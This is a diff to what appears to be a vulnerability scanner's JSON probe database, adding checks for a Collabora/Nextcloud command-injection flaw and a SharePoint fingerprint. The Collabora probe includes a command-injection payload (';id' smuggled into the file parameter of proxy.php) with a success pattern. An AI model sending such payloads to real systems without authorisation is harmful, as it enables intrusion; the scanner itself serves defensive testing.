@@ -1117,6 +1117,59 @@
           ]
         }
       ]
+    },
+    "collabora_nextcloud_cmdi_2026": {
+      "description": "Collabora Online / Nextcloud OS command injection (CVE-2026-110447, CVSS 9.2). Command injection via proxy.php in richdocumentscode. Active exploitation \u2014 webshell deployment observed. CISA KEV Oct 2026.",
+      "tech_match": [
+        "nextcloud",
+        "collabora",
+        "richdocumentscode"
+      ],
+      "probes": [
+        {
+          "payload": "/apps/richdocumentscode/proxy.php?req=/cool/convert-to/png&file=;id",
+          "description": "Collabora proxy.php command injection \u2014 the req parameter passes to a shell command. Benign: check if the response contains uid= or if the server returns 200 instead of 404",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "uid=|gid=|root:"
+            }
+          ]
+        },
+        {
+          "payload": "/apps/richdocumentscode/proxy.php",
+          "description": "Check if proxy.php endpoint exists (Collabora CODE installed)",
+          "matchers": [
+            {
+              "type": "status",
+              "value": "200"
+            }
+          ]
+        }
+      ]
+    },
+    "sharepoint_rce_2026": {
+      "description": "SharePoint RCE zero-day (CVE-2026-58644). Active exploitation, CISA KEV July 2026. Unauthenticated RCE via crafted request to SharePoint server.",
+      "tech_match": [
+        "sharepoint",
+        "microsoft"
+      ],
+      "probes": [
+        {
+          "payload": "/_layouts/15/version.aspx",
+          "description": "SharePoint version fingerprint \u2014 confirm SharePoint is present before targeted CVE probing",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "SharePoint",
+                "Microsoft.SharePoint",
+                "Version"
+              ]
+            }
+          ]
+        }
+      ]
     }
   }
 }
